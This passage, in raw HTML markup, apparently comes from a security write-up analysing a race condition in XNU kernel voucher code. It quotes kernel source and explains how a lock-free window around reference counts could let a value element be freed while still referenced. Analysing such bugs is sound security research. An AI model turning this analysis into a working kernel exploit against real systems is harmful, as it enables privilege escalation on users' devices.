 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;KERN_SUCCESS &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;kr&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_release&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivac&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;kr&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;...&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7 BGLtzooHlW-c23&quot;&gt;WINDOW&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;&amp;nbsp;*/&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; val_index &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;ivace_reference_by_value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivac&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;new_value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;new_flag&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c19 BGLtzooHlW-c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;We already looked at this code; if you can&amp;#39;t remember what &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivam_get_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;or &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_reference_by_value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;are meant to do, I&amp;#39;d suggest going back and looking at those sections again.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;Firstly, &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ipc_voucher_replace_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;itself isn&amp;#39;t holding any locks. It does however hold a few references (e.g., on the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivac&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivam&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;.)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;user_data_get_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;(the value of &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivam-&amp;gt;ivam_get_value&lt;/span&gt;&lt;span&gt;) only takes the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;user_data&lt;/span&gt;&lt;span&gt;&amp;nbsp;lock (and not in all paths; we&amp;#39;ll get to that) and &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_reference_by_value&lt;/span&gt;&lt;span&gt;, which increments &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace-&amp;gt;ivace_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;does that under the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivac&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;lock.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;should therefore &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c17&quot;&gt;always&lt;/span&gt;&lt;span&gt;&amp;nbsp;get incremented before any corresponding &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace&lt;/span&gt;&lt;span&gt;&amp;#39;s &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;field. And there is a small window (marked as &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c23&quot;&gt;WINDOW&lt;/span&gt;&lt;span&gt;&amp;nbsp;above) where &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;will be &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c17&quot;&gt;larger&lt;/span&gt;&lt;span&gt;&amp;nbsp;than the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;field of the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace&lt;/span&gt;&lt;span&gt;&amp;nbsp;which will end up with a pointer to the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;. If, in exactly that window shown above, another thread grabs the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivac&lt;/span&gt;&lt;span&gt;&amp;#39;s lock and drops the last reference (&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_refs&lt;/span&gt;&lt;span&gt;) on the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace&lt;/span&gt;&lt;span&gt;&amp;nbsp;which currently points to that &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;&amp;nbsp;then we&amp;#39;ll encounter one of the more complex situations outlined above where, in &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_release&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;is &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c17&quot;&gt;not&lt;/span&gt;&lt;span&gt;&amp;nbsp;equal to the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;&amp;#39;s &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;field. The reason that there is special treatment of that case is that it&amp;#39;s indicating that there is a live pointer to the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;&amp;nbsp;which isn&amp;#39;t yet accounted for by the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace&lt;/span&gt;&lt;span&gt;, and therefore it&amp;#39;s not valid to free the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c19 BGLtzooHlW-c11&quot;&gt;user_data_value_element.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;Another way to view this is that it&amp;#39;s a hack around not holding a lock across that window shown above.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;With this insight we can start to unravel the &amp;quot;redrive&amp;quot; logic:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c19 BGLtzooHlW-c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.1c71158a8af57bb6d3e831d618708883a379cc86&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.49&quot;&gt;&lt;/a&gt;&lt;table class=&quot;BGLtzooHlW-c12&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;BGLtzooHlW-c1&quot;&gt;&lt;td class=&quot;BGLtzooHlW-c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace_made &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;made&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;KERN_SUCCESS &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;kr&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace_made &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;made&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;ivace&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace_refs&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;goto&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;redrive&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace_releasing &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;FALSE&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_unlock&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivac&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/*&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* If the manager returned FAILURE, someone took a&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* reference on the value but have not updated the ivace,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* release the lock and return since thread who got&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* the new reference will update the ivace and will have&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* non-zero reference on the value.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;*/&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;KERN_SUCCESS &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;kr&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace_releasing &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;FALSE&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_unlock&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivac&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;Let&amp;#39;s take the first case:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;made&lt;/span&gt;&lt;span&gt;&amp;nbsp;is the value of &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace-&amp;gt;ivace_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;before the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivac&lt;/span&gt;&lt;span&gt;&amp;#39;s lock was dropped and re-acquired. If those are different, it indicates that a race did occur and another thread (or threads) revived this &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace&lt;/span&gt;&lt;span&gt;&amp;nbsp;(since even though the refs has gone to zero it 